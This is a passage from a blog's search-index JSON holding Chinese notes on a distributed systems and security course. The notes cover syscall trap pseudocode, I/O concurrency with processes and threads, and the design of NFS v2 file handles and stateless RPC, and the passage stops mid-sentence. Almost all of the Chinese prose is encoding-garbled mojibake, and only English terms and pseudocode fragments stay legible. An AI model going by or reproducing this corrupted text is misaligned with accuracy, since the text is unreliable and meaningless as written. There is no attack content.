ä¸ºæ¥è§¦äº†åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç”Ÿæ€ï¼Œæˆ‘é€‰æ‹©äº†æ¢è¯¾ã€‚ç¬¬ä¸€èŠ‚è¯¾å¼€å§‹æ²¡å¤šä¹…ï¼Œæˆ‘ä¾¿ç¡®ä¿¡è‡ªå·±åšå‡ºäº†æ˜æ™ºçš„ï¼ˆæˆ–è®¸è¿˜æ˜¯å½±å“æ·±è¿œçš„ï¼‰å†³å®šã€‚ Brad Karp è€å¸ˆè®²è§£æ¸…æ™°åˆä¸å¤±é£è¶£ï¼Œç¡¬æ˜¯æŠŠçº¿ä¸Šè¯¾ä¸Šå‡ºäº†çº¿ä¸‹è¯¾çš„ä½“éªŒã€‚å°½ç®¡æ‰ä¸Šäº†ä¸¤å‘¨çš„è¯¾ï¼Œæˆ‘ç›¸ä¿¡è¿™é—¨è¯¾ä¼šè®©æˆ‘å—ç›ŠåŒªæµ…ã€‚ ä¸€å¼€å§‹ç»™æˆ‘ç•™ä¸‹æ¯”è¾ƒå¥½çš„å°è±¡çš„å°±æ˜¯è€å¸ˆæ‘’å¼ƒäº†å­¦æ ¡çš„è¯¾ç¨‹å¹³å° Moodleï¼Œè½¬è€Œä½¿ç”¨ GitHub Classroom å’Œ Piazzaã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œæ‰€è°“å­¦æ ¡çš„è¯¾ç¨‹å¹³å°å¹¶ä¸ä¼šç»™å¸ˆç”Ÿå¸¦æ¥ä»€ä¹ˆå¥½çš„ä½“éªŒã€‚ æ­¤å¤–ï¼ŒGitHub Classroom è¿˜èƒ½è‡ªåŠ¨æµ‹è¯•å’Œæ‰¹æ”¹ä½œä¸šï¼Œå¾ˆæœ‰æ„æ€ï¼Œä½¿ç”¨ä½“éªŒä¹Ÿå¾ˆå¥½ã€‚ è¿™é—¨è¯¾æ˜¯æ²¡æœ‰æ•™æçš„ï¼Œè¿™å®é™…ä¸Šå¯¹è€å¸ˆçš„æ°´å¹³æå‡ºäº†å¾ˆé«˜çš„è¦æ±‚ï¼šä»–å¿…é¡»è‡ªå·±å››å¤„æ”¶é›†èµ„æºå¤‡è¯¾ã€è®²è¿°è‡ªå·±çš„ç†è§£ï¼Œè€Œéå°†æ•™æä¸Šçš„å†…å®¹ç•¥ä½œä¿®æ”¹ã€ç…§æœ¬å®£ç§‘ã€‚å–è€Œä»£ä¹‹çš„é˜…è¯»ææ–™æ˜¯ä¸€ç³»åˆ—ç»å…¸è®ºæ–‡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:1:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"èƒŒæ™¯ ","date":"2021-10-18","objectID":"/distributed-systems/:2:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ä¸­å¿ƒåŒ–ç³»ç»Ÿé¢ä¸´çš„é—®é¢˜ å•èŠ‚ç‚¹æ•…éšœ éš¾ä»¥æ”¯æ’‘æµé‡è¾ƒå¤§çš„åº”ç”¨ æ˜“å—æ”»å‡»ï¼Œä¸”å—åˆ°æ”»å‡»åæŸå¤±è¾ƒå¤§ï¼ˆè¿™å…¶å®ä¹Ÿåº”è¯¥ç®—åˆ°å•èŠ‚ç‚¹æ•…éšœé‡Œï¼Ÿå¯èƒ½ä¸èƒ½ç®—æ•…éšœï¼‰ éš¾ä»¥ä¼¸ç¼©ä»¥æé«˜èµ„æºåˆ©ç”¨ç‡ å‡çº§ä¸ç»´æŠ¤æ—¶å¿…é¡»ä¸­æ­¢æœåŠ¡ åœ°ç†è·ç¦»å¸¦æ¥çš„ç½‘ç»œå»¶è¿Ÿ ","date":"2021-10-18","objectID":"/distributed-systems/:2:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"åˆ†å¸ƒå¼ç³»ç»Ÿå¼•å…¥çš„é—®é¢˜ æ•°æ®ä¸€è‡´æ€§ èŠ‚ç‚¹é—´çš„ç½‘ç»œå»¶è¿Ÿã€ç½‘ç»œé”™è¯¯ Heterogeneity å¼‚è´¨æ€§ï¼Œä¸åŒèŠ‚ç‚¹å¯èƒ½ä½¿ç”¨ä¸åŒè¯­è¨€ã€æ¥å£ã€API ç­‰ èŠ‚ç‚¹é—´å¹¶å‘é—®é¢˜ Partition resilienceï¼Œä¸çŸ¥é“æ€ä¹ˆç¿»è¯‘ï¼Œå¼¹æ€§åˆ’åˆ†é—®é¢˜ï¼Ÿ å…³äº Partition resilience é—®é¢˜ï¼šå‡è®¾ä¸¤ä¸ªç”¨æˆ·åœ¨ä¸¤ä¸ªä¸åŒçš„æœåŠ¡èŠ‚ç‚¹ä¸ŠåŒæ—¶è´­ä¹°äº†æœ€åä¸€å¼ æœºç¥¨ï¼Œè¿™å¼ æœºç¥¨å°±ä¼šè¢«å–å‡ºä¸¤æ¬¡ã€‚æœ‰ç‚¹åƒæ•°æ®ä¸€è‡´æ€§é—®é¢˜ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:2:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"OS ç›¸å…³ è¿™ä¸ªéƒ¨åˆ†åŸºæœ¬æ˜¯æœ¬ç§‘ã€Šæ“ä½œç³»ç»Ÿã€‹è¯¾å’Œ Pwn çš„å†…å®¹ï¼Œè®°å½•æ—¶é¡ºä¾¿å¤ä¹ ä¸‹ã€‚ Syscall ä¾‹å¦‚ï¼Œåº”ç”¨é€šè¿‡ close(3) å…³é—­æ–‡ä»¶ã€‚è€Œåœ¨ C å‡½æ•°åº“ä¸­æ˜¯è¿™æ ·è°ƒç”¨ syscall çš„ï¼š close(x) { R0 \u003c- 73 R1 \u003c- x TRAP RET } TRAP å®é™…ä¸Šåšçš„æ˜¯ï¼š XP \u003c- PC // switch to kernel address space // set privileged flag (to enter high privlege mode) PC \u003c- address of kernel trap handler è¿™é‡Œçš„ XP æ˜¯æŸä¸ªç”¨æ¥æš‚æ—¶å­˜æ”¾ PC çš„å¯„å­˜å™¨ã€‚æˆ‘ä»¬å®¹æ˜“æƒ³åˆ°ï¼Œä¹‹åå°±è¦åœ¨å†…æ ¸ä¸­è¿è¡Œä»£ç äº†ï¼Œè¿™å…¶å®æ˜¯ååˆ†å±é™©çš„æ“ä½œã€‚æ€ä¹ˆä¿è¯åº”ç”¨ä¸ä¼šåœ¨å†…æ ¸é‡Œä¹±æå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ Protected Transfer æœºåˆ¶ã€‚ ä¸ºäº†é¿å…ç”¨æˆ·åœ¨å†…æ ¸é‡Œéšä¾¿è¿è¡Œä»£ç ï¼Œåªæœ‰é€šè¿‡ kernel entrypoint è¿›å…¥å†…æ ¸æ‰èƒ½è¿è¡Œä»£ç ï¼Œè€Œè¿™ä¸ª entrypoint å°±æ˜¯ trap handlerã€‚è‡³äºå…·ä½“è·³åˆ°å†…æ ¸çš„ä»€ä¹ˆä½ç½®åˆ™ç”±ç¡¬ä»¶å†³å®šï¼Œè€Œä¸èƒ½ç”±åº”ç”¨æ¥æŒ‡å®šã€‚è¿™ä¸ªå…·ä½“ä½ç½®åˆ™åªèƒ½é€šè¿‡åœ¨å¯åŠ¨æ—¶è¿è¡Œçš„å†…æ ¸æ€ä»£ç æ¥å†³å®šï¼Œç¡®ä¿äº†ç”¨æˆ·æ€ç¨‹åºæ— æ³•éšæ„è·³è½¬åˆ°å†…æ ¸ä»»æ„ä½ç½®ã€‚ æ¥ç€ï¼Œåœ¨å†…æ ¸çš„ trap handler ä¸­ï¼š // save regs to this process' PCB SP \u003c- kernel stack sys_close() // executing in \"kernel half\" of process // restore regs from PCB TRAPRET æœ€åçš„ TRAPRET çš„æµç¨‹å°±æ¯”è¾ƒç®€å•äº†ï¼š PC \u003c- XP // clear privileged flag // switch to process address space // continue execution å¯ä»¥çœ‹åˆ°ï¼ŒTRAP å’Œ TRAPRET è¦ä¿å­˜ / æ¢å¤ PCã€åˆ‡æ¢åœ°å€ç©ºé—´ã€åˆ‡æ¢ç”¨æˆ·æ€ / å†…æ ¸æ€ï¼Œè€Œ trap handler è¦ä¿å­˜ / æ¢å¤å¯„å­˜å™¨ï¼Œè¿™äº›è¿‡ç¨‹æ˜¯å¿…éœ€çš„ä½†åˆå¹¶æ²¡æœ‰äº§ç”Ÿå®é™…çš„ä»·å€¼ï¼Œè¿˜ç›¸å¯¹æ¯”è¾ƒè€—æ—¶ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:2:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å¹¶å‘ IO è€Œä¸”ï¼ŒSyscall å¸¸å¸¸æ¶‰åŠé˜»å¡ IO æ“ä½œï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šé™ä½äº†èµ„æºåˆ©ç”¨ç‡ã€‚ä¸€èˆ¬æ¥è¯´æœ‰å¦‚ä¸‹ä¸‰ç§è§£å†³æ–¹æ³•ï¼š å¤šè¿›ç¨‹ å•è¿›ç¨‹ã€å¤šçº¿ç¨‹ äº‹ä»¶é©±åŠ¨ IO ä½†é¦–å…ˆï¼ŒOS æœ¬èº«å¯¹å•è¿›ç¨‹å•çº¿ç¨‹ä¹Ÿæä¾›äº†ä¸€å®šç¨‹åº¦çš„å¹¶å‘ IOï¼Œæ¯”å¦‚ï¼š åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¼šè¿›è¡Œ read-ahead å’Œ write-behind é¢„è¯»å†™ç£ç›˜æ•°æ® ç±»ä¼¼åœ°ï¼Œread() æ¥æ”¶ç½‘ç»œåŒ…æ—¶ä¹Ÿä¼šæ‹·è´åˆ° kernel socket bufferï¼Œwrite() å‘é€æ•°æ®åŒ…æ—¶ä¹Ÿä¼šæ‹·è´åˆ° kernel socket buffer å¤šè¿›ç¨‹ å¤šè¿›ç¨‹å¾ˆå®¹æ˜“ç†è§£ï¼šå½“ä¸€ä¸ªè¿›ç¨‹é˜»å¡åï¼Œåˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹è¿è¡Œã€‚ä¼˜ç‚¹åœ¨äºï¼š è¿›ç¨‹é—´æœ¬èº«å°±ç›¸äº’éš”ç¦»ï¼Œä¸ä¼šäº’ç›¸å½±å“ ï¼ˆå¦‚æœæœ‰å¤šä¸ª CPUï¼‰åŒæ—¶è¿˜è‡ªåŠ¨è·å¾—äº† CPU å¹¶å‘ ä¸è¿‡ CPU å¹¶å‘æ²¡æœ‰ IO å¹¶å‘é‚£ä¹ˆé‡è¦ï¼Œç›¸å¯¹ IO å¹¶å‘è€Œè¨€æ›´éš¾å®ç°ï¼Œä¸¤è€…å¯¹é€Ÿåº¦çš„æå‡ä¹Ÿæ˜¯ 2 å€å’Œ 100 å€çš„æ•°é‡çº§ã€‚æ­¤æ—¶ï¼Œæ°ªé‡‘å¤šä¹°å‡ å°æœºå™¨æ˜¾ç„¶æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ ç„¶è€Œï¼Œå¤šè¿›ç¨‹ä¹Ÿæœ‰ç¼ºç‚¹ï¼š fork() è°ƒç”¨æœ¬èº«æ¯”è¾ƒè€—æ—¶ã€è€—å†…å­˜ï¼Œ300 å¾®ç§’å·¦å³çš„è€—æ—¶å¹¶ä¸èƒ½é€šè¿‡æå‡æœºå™¨é…ç½®æ¥ç¼©çŸ­ éš”ç¦»æ€§åŒæ—¶ä¹Ÿæ˜¯ç¼ºç‚¹ï¼Œä¸å…±äº«å†…å­˜æ„å‘³ç€æ„å»ºç¼“å­˜æˆ–æ˜¯è®°å½•ç»Ÿè®¡æ•°æ®æ¯”è¾ƒéº»çƒ¦ å¤šçº¿ç¨‹ å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ›´è½»é‡çº§çš„çº¿ç¨‹ï¼Œæ­¤æ—¶çº¿ç¨‹ä»¬å…±äº«å†…å­˜ä¸”åˆ†åˆ«æ‹¥æœ‰è‡ªå·±çš„æ ˆï¼Œç»´æŒäº†ä¸€å®šçš„ç‹¬ç«‹æ€§ã€‚è¿™ä¸€å¥½å¤„å¸¦æ¥çš„æ˜¯éå¸¸æ£˜æ‰‹çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯çº¿ç¨‹ä¹‹é—´æœ¬èº«ä¼šäº’ç›¸å½±å“ã€çº¿ç¨‹å¯¹æ•°æ®çš„è¯»å†™åŒæ ·å¦‚æ­¤ï¼Œä½¿å¾—æˆ‘ä»¬ä¸å¾—ä¸å¼•å…¥é”çš„æœºåˆ¶æ¥é¿å…è¿™äº›é—®é¢˜ã€‚ä½†æ˜¯å¼•å…¥æ–°æœºåˆ¶åˆä¼šå¸¦æ¥æ–°é—®é¢˜ï¼Œæ¯”å¦‚é¥¥é¥¿ã€æ­»é”ç­‰ã€‚ è¿™å¾ˆåƒä¹‹å‰çœ‹åˆ°çš„ç«ç®­å·¥ç¨‹ï¼šè¦è®©ç«ç®­é£èµ·æ¥å°±éœ€è¦å¸¦è¶³å¤Ÿçš„ç‡ƒæ–™ï¼Œä½†è¿™äº›ç‡ƒæ–™æœ¬èº«ä¹Ÿæœ‰é‡é‡ï¼Œäºæ˜¯éœ€è¦æ›´å¤šçš„ç‡ƒæ–™è®©æ•´ä¸ªç«ç®­é£èµ·æ¥â€¦â€¦ï¼ˆåå·´æ‹‰å¤ªç©ºè®¡åˆ’æ ¸å¿ƒç©æ³•ï¼‰ å‡ ä¹æ‰€æœ‰ç°ä»£æ“ä½œç³»ç»Ÿéƒ½å¯¹å¤šçº¿ç¨‹æœ‰åŸç”Ÿæ”¯æŒï¼Œè¿™ä¸€èˆ¬æ˜¯é€šè¿‡å†…æ ¸çº¿ç¨‹å®ç°çš„ã€‚è¿™ç§å®ç°ä¸‹ï¼Œå†…æ ¸æ¸…æ¥šåœ°çŸ¥é“æ¯ä¸ªçº¿ç¨‹çš„çŠ¶æ€ï¼Œä¹Ÿå¯ä»¥äº²è‡ªè°ƒåº¦çº¿ç¨‹åˆ° CPU ä¸Šï¼Œéå¸¸çµæ´»ä¸”åŒæ—¶æ”¯æŒ CPU å¹¶å‘å’Œ IO å¹¶å‘ã€‚å¯¹äºçº¿ç¨‹æ¥è¯´ï¼Œæ¯ä¸ªçº¿ç¨‹ä¸ä»…éœ€è¦åŸæœ‰çš„ç”¨æˆ·æ€æ ˆï¼Œè¿˜éœ€è¦ç»´æŠ¤è‡ªå·±çš„å†…æ ¸æ ˆå’Œå¯„å­˜å™¨è¡¨ã€‚ è¿™ä¹ˆåšçš„ä»£ä»·å°±æ˜¯ï¼š åˆ›å»ºçº¿ç¨‹è¦å†…æ ¸å¹²æ¶‰ çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢è¦å†…æ ¸å¹²æ¶‰ åŠ é”è§£é”ä¹Ÿè¦å†…æ ¸å¹²æ¶‰ å®ç°èµ·æ¥å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äº OSï¼Œéš¾ä»¥ç§»æ¤ è‡³äºç”¨æˆ·çº¿ç¨‹ï¼Œå¯¹å†…æ ¸æ¥è¯´å°±æ˜¯ä¸å¯è§çš„ï¼Œå†…æ ¸åªè´Ÿè´£è°ƒåº¦è¿›ç¨‹ã€‚æ­¤æ—¶ï¼Œè¿›ç¨‹å†…éƒ¨å°±éœ€è¦ä¸€ä¸ªçº¿ç¨‹è°ƒåº¦å™¨ï¼Œæ¸…æ™°åœ°çŸ¥é“æ¯ä¸ªçº¿ç¨‹çš„çŠ¶æ€å¦‚ä½•å¹¶åŠæ—¶è°ƒåº¦ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œéé˜»å¡å¼ Syscall äº†ï¼š read() { // tell kernel to start read // mark thread waiting for read sched(); } sched() { // ask kernel for IO completion events // mark corresponding threads runnable // find runnable thread // restore regs and return } çœ‹èµ·æ¥å¾ˆä¸é”™ï¼Œä½†æ˜¯ä»”ç»†æƒ³æƒ³ï¼Œè¿™ä¸­é—´æ¶‰åŠçš„äº‹ä»¶é€šçŸ¥æœºåˆ¶ï¼Œéœ€è¦æˆ‘ä»¬çš„è°ƒåº¦å™¨å…·å¤‡ç›¸å½“å¼ºå¤§çš„èƒ½åŠ›ã€‚å®ƒéœ€è¦è®©å†…æ ¸é€šçŸ¥å®ƒï¼š åˆ›å»ºç½‘ç»œè¿æ¥äº‹ä»¶ æ•°æ®åˆ°è¾¾ socket äº‹ä»¶ ç£ç›˜è¯»å–å®Œæˆäº‹ä»¶ socket èƒ½å¤Ÿç»§ç»­è¢« write() äº‹ä»¶ â€¦â€¦è¿™åŸºæœ¬ä¸Šå°±æ˜¯åœ¨ç»„è£…ä¸€ä¸ªå°å‹ OS äº†ã€‚æ›´ä¸ç”¨è¯´ï¼Œäº‹ä»¶é€šçŸ¥æœºåˆ¶åœ¨ OS é‡Œä¸€èˆ¬ä¹Ÿæ²¡æœ‰å®Œæ•´çš„æ”¯æŒï¼Œæ¯”å¦‚åœ¨ Unix ä¸­å°±æ²¡æœ‰æ–‡ä»¶ç³»ç»Ÿæ“ä½œå®Œæˆäº‹ä»¶çš„é€šçŸ¥æœºåˆ¶ã€‚Syscall ä¹Ÿå¹¶ä¸æ€»æ˜¯èƒ½å®Œå…¨ä¸è¿›è¡Œé˜»å¡ç­‰å¾…ï¼Œæ¯”å¦‚ open() å’Œ stat() ç­‰ã€‚ æœ€åï¼Œéé˜»å¡å¼ Syscall è¿˜å¾ˆéš¾å®ç°ã€‚ä¾‹å¦‚å¯ä»¥çœ‹ä¸‹ sys_read() çš„å¤§è‡´å®ç°ï¼š sys_read(fd, user_buffer, n) { // read the file's i-node from disk struct inode *i = alloc_inode(); start_disk(..., i); wait_for_disk(i); // the i-node tells us where the data are; read it struct buf *b = alloc_buf(i-\u003e...); start_disk(..., b); wait_for_disk(b); copy_to_user(b, user_buffer); } è¿™ä¸ªå‡½æ•°åˆ†ä¸ºä¸¤æ­¥ï¼Œå…ˆè·å– inodeï¼Œå†å†™å…¥ bufferï¼ŒæœŸé—´éƒ½éœ€è¦ wait_for_disk()ï¼Œä½¿å¾—ç¨‹åºåœ¨å†…æ ¸ä¸­è¢«æŒ‚èµ·ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéé˜»å¡å¼çš„ Syscall æ­¤æ—¶éœ€è¦ä»å†…æ ¸ä¸­è¿”å›é˜²æ­¢é˜»å¡ï¼Œä½†è¿™æ ·å†…æ ¸å°±æ— ä»çŸ¥æ™“ sys_read() åˆšæ‰æ‰§è¡Œåˆ°å“ªé‡Œäº†ï¼Œsys_read() ä¹Ÿæ²¡æ³•ç»§ç»­æ‰§è¡Œä¸‹å»äº†ã€‚ å› æ­¤ï¼Œå¦‚æœè¦ä½¿ç”¨ç”¨æˆ·çº¿ç¨‹ï¼Œæˆ‘ä»¬è¦ä¹ˆåªèƒ½ä½¿ç”¨ä¸€ä¸ªæ”¯æŒä¸é‚£ä¹ˆå®Œæ•´çš„å®ç°ï¼Œè¦ä¹ˆå°±æ˜¯é‡å†™åº•å±‚çš„ Syscall ä½¿å¾—ä¸€ä¸ª Syscall å†…éƒ¨æ‰§è¡Œä¸€ä¸ªéé˜»å¡çš„è¿‡ç¨‹ã€‚è¿™ä¼šå¯¼è‡´ä¸€ä¸ª open() çš„ç³»ç»Ÿè°ƒç”¨å¯èƒ½ä¼šè¢«æ‹†æˆå‡ åä¸ªå°ç³»ç»Ÿè°ƒç”¨ï¼Œæ¯”å¦‚é€šè¿‡ lookup_one_path_component() æŸ¥æ‰¾ä¸€å±‚ç›®å½•ã€‚æ¯«æ— ç–‘é—®ï¼Œè¿™ä¼šå¯¼è‡´ä»£ç æå…¶ç¹çã€‚ æ€»çš„æ¥è¯´ï¼Œå¯èƒ½åªæœ‰å¯¹æ€§èƒ½æœ‰è‹›åˆ»è¦æ±‚çš„æƒ…å†µä¸‹æ‰ä¼šä½¿ç”¨ç”¨æˆ·çº¿ç¨‹ï¼Œä»¥èŠ‚çœæ‰ç”¨æˆ·æ€ / å†…æ ¸æ€åˆ‡æ¢çš„å¼€é”€ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:2:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"NFS è¿™é‡Œä¸»è¦è®¨è®º NFS v2ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:3:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"è®¾è®¡ç›®æ ‡ åº”å½“èƒ½å¤Ÿç”¨äºç°å­˜çš„åº”ç”¨ï¼Œå³æä¾›ä¸ Unix æ–‡ä»¶ç³»ç»Ÿç›¸åŒçš„è¯­ä¹‰ åº”å½“èƒ½å¤Ÿç®€å•åœ°éƒ¨ç½² åº”å½“æ”¯æŒå¤šç§å¹³å° åº”å½“è¶³å¤Ÿé«˜æ•ˆï¼Œä½†ä¸éœ€è¦å’Œ Unix æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸€æ ·é«˜æ•ˆ ","date":"2021-10-18","objectID":"/distributed-systems/:3:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"è¿œç¨‹æ–‡ä»¶ä¸ç›®å½•çš„å‘½å NFS Client ä½¿ç”¨ mounter å°†è¿œç¨‹ç›®å½•æŒ‚è½½åˆ°æœ¬åœ°ç›®å½•ã€‚mounter å‘æŒ‡å®šçš„ NFS Server å‘é€ RPC è¯·æ±‚å¹¶è·å¾—ä¸€ä¸ª 32 å­—èŠ‚çš„ file handle ç”¨äºåç»­è¯·æ±‚ï¼Œå¯ä»¥å°† file handle ç†è§£ä¸º inodeã€‚å¯¹ NFS Server è€Œè¨€ï¼Œfile handle å®é™…ä¸Šç”± fs identifierã€inode number å’Œ generation number ä¸‰éƒ¨åˆ†ç»„æˆã€‚ ä¸ºä»€ä¹ˆ NFS ä¸ç›´æ¥ç”¨å¸¸è§„çš„æ–‡ä»¶è·¯å¾„æ¥æ ‡è¯†æ–‡ä»¶å‘¢ï¼Ÿå½“ç„¶æ˜¯ä¸ºäº†å¤„ç†æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ã€‚å‡è®¾ä¸€ä¸ª Client æ‰“å¼€äº† dir1 ä¸‹çš„æ–‡ä»¶æ­£å‡†å¤‡è¯»å–ï¼Œæ­¤æ—¶å¦ä¸€ä¸ª Client å´é‡å‘½åäº†è¿™ä¸ªç›®å½•ä¸º dir2ï¼Œé‚£ä¹ˆæ ¹æ® Unix è§„èŒƒæœ€ç»ˆè¯»å–çš„è·¯å¾„æ˜¯ dir2/xxx ã€‚å¦‚æœ NFS ç›´æ¥ç”¨æ–‡ä»¶è·¯å¾„æ ‡è¯†æ–‡ä»¶ï¼Œå°±æ— æ³•ä¸ Unix æ–‡ä»¶ç³»ç»Ÿçš„è¡Œä¸ºä¿æŒä¸€è‡´ï¼Œè¿™ä¹Ÿæ˜¯ file handle ä¸­å¼•å…¥ inode çš„åŸå› ã€‚ é‚£ä¹ˆ generation number åˆæœ‰ä»€ä¹ˆç”¨ï¼Ÿå‡è®¾ä¸€ä¸ª Client æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æ­£å‡†å¤‡è¯»åŒºï¼Œæ­¤æ—¶å¦ä¸€ä¸ª Client å´åˆ é™¤äº†è¿™ä¸ªæ–‡ä»¶ï¼Œåˆ›å»ºäº†æ–°çš„åŒåæ–‡ä»¶ï¼Œé‚£ä¹ˆæ ¹æ® Unix è§„èŒƒæœ€ç»ˆè¯»å–çš„æ˜¯æ—§æ–‡ä»¶çš„å†…å®¹ã€‚å¦‚æœ NFS æ°å¥½å°†æ—§æ–‡ä»¶çš„ inode åˆ†é…ç»™æ–°åˆ›å»ºçš„æ–‡ä»¶ï¼Œå°±ä¼šå¯¼è‡´è¯»åˆ°çš„æ˜¯æ–°æ–‡ä»¶çš„å†…å®¹ã€‚generation number åˆ™ä¼šåœ¨é‡ç”¨ inode æ—¶ +1ï¼Œç¡®ä¿è¯»åˆ°çš„æ˜¯åŸæ¥çš„æ—§æ–‡ä»¶ã€‚è§£å†³äº†é‡ç”¨ inode çš„é£é™©ï¼ŒNFS Server å°±èƒ½ç«‹åˆ»å›æ”¶ inodeã€‚ å³ä½¿ Client æ‰“å¼€æ–‡ä»¶è·å¾— file handle å Server å®•æœºï¼Œè¿™ä¸ª file handle åœ¨ Server æ¢å¤åä¾ç„¶æœ‰æ•ˆã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:3:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"RPC ä»¥è¯»æ–‡ä»¶ä¸ºä¾‹ï¼š å›¾ä¸­çš„ fh æŒ‡ file handlerï¼Œå¹¶ä¸”é»˜è®¤ Application ä¹‹å‰å·²ç»è·å¾—äº†ç›®å½•çš„ file handler å³ dirfhã€‚ ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒServer å¹¶ä¸éœ€è¦ç»´æŠ¤ä»»ä½•å®¢æˆ·ç«¯çŠ¶æ€ï¼Œæ¯æ¬¡ RPC è¯·æ±‚ä¸­å¸¦ç€è¯»æ–‡ä»¶æ‰€éœ€è¦çš„å…¨éƒ¨ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ Server æ˜¯ä¸€ä¸ªæ— çŠ¶æ€æœåŠ¡ã€‚æ— çŠ¶æ€æœåŠ¡çš„å¥½å¤„åœ¨äºï¼š å¯¹ Server æ¥è¯´ï¼Œä»æ•…éšœä¸­æ¢å¤å¹¶ä¸éœ€è¦åšä»»ä½•é¢å¤–çš„äº‹ï¼Œå°±å¥½åƒæ•…éšœä»æ¥æ²¡å‘ç”Ÿè¿‡ä¸€æ · å¯¹ Client æ¥è¯´ï¼Œå¦‚æœè¯·æ±‚æ²¡æœ‰å¾—åˆ°å“åº”ï¼Œåªè¦ä¸æ–­é‡è¯•å³å¯ é‡è¯•å¯¼è‡´çš„ç»“æœæ˜¯ï¼ŒåŒä¸€ä¸ªè¯·æ±‚å¯èƒ½è¢« Server æ‰§è¡Œå¤šæ¬¡ï¼Œå¦‚æœæ˜¯ç±»ä¼¼åˆ é™¤æ–‡ä»¶ç­‰è¯·æ±‚ï¼Œå°±ä¼šå‡ºç°å¥‡æ€ªçš„ç»“æœã€‚åæ¥ï¼ŒNFS é€šè¿‡è®© Server ç»´æŠ¤ä¸€ä¸ª transaction ID å’Œ reply cache æ¥é¿å…è¿™ä¸€é—®é¢˜ï¼Œä¸è¿‡ reply cache å°±ä¼šåœ¨é‡å¯åå¤±æ•ˆäº†ã€‚æ¢è€Œè¨€ä¹‹ï¼Œå¦‚æœ Client åœ¨ Server æ­£å¸¸æ—¶åˆ é™¤äº†æ–‡ä»¶ï¼ŒServer é‡å¯åå†æ¬¡åˆ é™¤ï¼Œä¾ç„¶ä¼šå¾—åˆ°â€œæ–‡ä»¶ä¸å­˜åœ¨â€çš„é”™è¯¯ï¼Œä½†è¿™ç§æƒ…å†µå·²ç»æ˜¯å°æ¦‚ç‡äº‹ä»¶äº†ã€‚ å¦‚æœä½¿ç”¨ä¸€ç§æ›´å¥å…¨çš„æ–¹æ¡ˆï¼Œå°±éœ€è¦æŒä¹…åŒ–åˆ°ç£ç›˜ä¸Šè¿™ä¼šå¸¦æ¥å¾ˆå¤§çš„å¼€é”€å’Œå®ç°å¤æ‚åº¦ã€‚NFS 